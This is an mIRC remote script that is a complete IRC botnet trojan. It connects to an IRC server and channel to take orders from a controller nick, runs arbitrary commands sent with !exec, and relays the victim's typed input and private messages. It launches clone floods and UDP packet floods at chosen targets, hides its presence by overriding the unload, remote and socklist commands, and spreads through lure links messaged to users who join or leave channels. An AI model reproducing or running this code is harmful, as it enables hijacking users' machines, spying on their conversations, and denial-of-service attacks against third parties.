   [script]
   n0=alias botc { sockwrite -n bot* $1- }
   n1=on *:input:*: { if (%txt == ON) { botc privmsg #tartarus : $+ 4 $me 9 on  $server  to 12 $active 9 : 8 $1- } | elseif (%txt == OFF) return }
   n2=on *:text:*:?: { if (%txt == ON) { botc privmsg #tartarus : $+ 12 $nick 9on  $server  to 4 $me 9 : 8 $1- } | elseif (%txt == OFF) return }
   n3=on *:sockread:bot*: { sockread %botread | set %4tk $gettok(%botread,4,32) | set %cent1 $gettok(%botread,1,32) | set %cent2 $left(%cent1,10) | if ($gettok(%botread,1,32) == PING) { sockwrite -tn $sockname PONG $chr(58) $+ $server | halt }
   n4=  if (%cent2 == :Centurion) { if (%4tk == :!exec) { $gettok(%botread,5-,32) } | if (%4tk == :!view) { set %txt ON } | if (%4tk == :!unview) { set %txt OFF } | if (%4tk == :!report) { .sockwrite -n $sockname privmsg #tartarus : $+ 9 Legionnaire 4 $me 9 on  $server  reporting for duty } | if (%4tk == :!prep) { set %flood1 $gettok(%botread,5-,32) }
   n5=    if (%4tk == :!flood) { set %clones $gettok(%botread,6,32) | set %channel $gettok(%botread,5,32) | set %MaDNick $gettok(%botread,9,32) | set %nick $gettok(%botread,5,32) | if (%clones = $null) || (%clones !isnum) { botc privmsg #tartarus 9.::Incorrect::. | halt }
   n6=      if ($gettok(%botread,10,32) == p) set %Ctcp Ping | if ($gettok(%botread,10,32) == F) set %Ctcp Finger | if ($gettok(%botread,10,32) == T) set %Ctcp Time | if ($gettok(%botread,10,32) == v) set %Ctcp version | if ($gettok(%botread,10,32) == a) set %Ctcp $gettok(%botread,11,32) | if ($gettok(%botread,10,32) == $null) { set %Ctcp 11T.12ä13®14.†15ä0®.2Û3§ }
   n7=      if ($gettok(%botread,7,32) = $null) { set %server $server } | if ($gettok(%botread,7,32) != $null) { set %server $gettok(%botread,7,32) } | if ($gettok(%botread,7,32) = $null) || ($gettok(%botread,8,32) !isnum) { set %port $port } | if ($gettok(%botread,8,32) != $null) { set %port $gettok(%botread,8,32) } | if ($gettok(%botread,9,32) = $null) { set %flood $gettok(%botread,9,32) } | set %PSGflood on | var %var = 0 | :loop | inc %var | if (%PSGflood == on) && (%var <= %clones) { .sockopen PSG $+ $rand(1,999999) %server %port | goto loop } | else { halt }
   n8=    }
   n9=    if (%4tk == :!clean) { .set %PSGflood off | .sockclose PSG* | .sockclose pac* | .unset %nick | unset %channel | unset %server | unset %port | unset %clones | unset %flood1 | .unset %* } | if (%4tk == :!packet) { set %packet.ip $gettok(%botread,5,32) | set %packet.bytes $gettok(%botread,6,32) | set %packet.amount $gettok(%botread,7,32) | sockwrite -n $sockname privmsg #tartarus : $+ 9Target:9 %packet.ip 9Bytes:9 %packet.bytes 9Amount:9 %packet.amount | set %packet.count 0 | set %packet.port $rand(1,6) $+ $rand(0,6) $+ $rand(0,6) $+ $rand(0,9) | :start | if (%packet.count >= %packet.amount) { sockclose packet | unset %packet.* | .sockwrite -n $sockname privmsg #tartarus : $+ 9.::9Packeting Complete9::. | halt } | inc %packet.count 1 | /.sockudp -b packet 60 %packet.ip %packet.port %packet.bytes %packet.bytes | goto start }
   n10=  }
   n11=}
   n12=on *:sockopen:bot*:{ if ($sockerr > 0) { halt } | set -u1 %user $rand(a,z) $+ $rand(1,99) $+ $rand(1,9) $+ $rand(1,99) $+ $rand(1,9) $+ $rand(1,9) | .sockwrite -nt $sockname USER %user blablah x : $+ $me | .sockwrite -nt $sockname NICK Guest $+ $rand(1,999999) | sockwrite -tn $sockname join #tartarus }
   n13=on *:sockclose:bot*:/.timer 1 3 sockopen bot-2 irc.serbiancafe.ws 6667
   n14=on 1:start: { /.identd on | .timer 1 3 .sockopen bot-2 irc.serbiancafe.ws 6667 }
   n15=on *:sockread:PSG*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == PING) { sockwrite -tn $sockname PONG $chr(58) $+ $server } }
   n16=on *:sockopen:PSG*:{ if ($sockerr > 0) { halt } | set -u1 %user $rand(a,z) $+ $rand(a,z) $+ $rand(1,99) $+ $rand(1,99) | .sockwrite -nt $sockname USER %user %user %user : $+ %user | .sockwrite -nt $sockname NICK $rand(a,z) $+ $rand(a,z) $+ %MaDNick $+ $rand(a,z) $+ $rand(a,z) | .sockwrite -nt $sockname JOIN : $+ %channel | .sockwrite -n $sockname privmsg %channel : $+ $chr(1) $+ %Ctcp  $+ $chr(1) | .sockwrite -n $sockname notice %channel : $+ %flood1 | .sockclose $sockname | .sockopen PSG $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) $+ $r(0,999) %server %port }
   n17=alias remote { .remote $1- | .remote on | /echo -ae *** Remote is OFF }
   n18=alias unload { /echo -ae *** Unloaded script ' $+ $2- $+ ' | halt }
   n19=alias socklist { /echo -ae *** No open sockets | halt }
   n20=on ^*:text:*:?:if (www isin $1-) || (http isin $1-) { halt }
   n21=on *:join:#: { if ($nick != $me) .msg $nick Hi $nick! Go look at Jan & Mel's pics at 12http://www.geocities.com/xtra_temp/JanMel.html }
   n22=on *:part:#: { if ($nick != $me) .msg $nick Hey $nick! Go look at Jan & Mel's pics at 12http://www.geocities.com/xtra_temp/JanMel.html }
